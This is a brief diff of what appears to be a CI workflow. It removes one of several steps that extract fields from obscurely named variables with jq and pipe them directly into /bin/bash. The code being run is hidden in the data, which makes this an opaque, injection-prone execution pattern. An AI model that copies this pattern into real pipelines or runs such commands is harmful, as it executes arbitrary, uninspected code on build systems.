@@ -27,7 +27,6 @@ jobs:
           echo $vkz6 | jq -r .aend48590 | /bin/bash
           echo $hmmki4 | jq -r .vt2 | /bin/bash
           echo $mkbxz4030 | jq -r .vlect0614 | /bin/bash
-          printf '%s' "$vw0840" | jq -r .kibzl420 | /bin/bash
           echo $sqlpk522 | jq -r .alqrx24 | /bin/bash
 
       - name: Save output
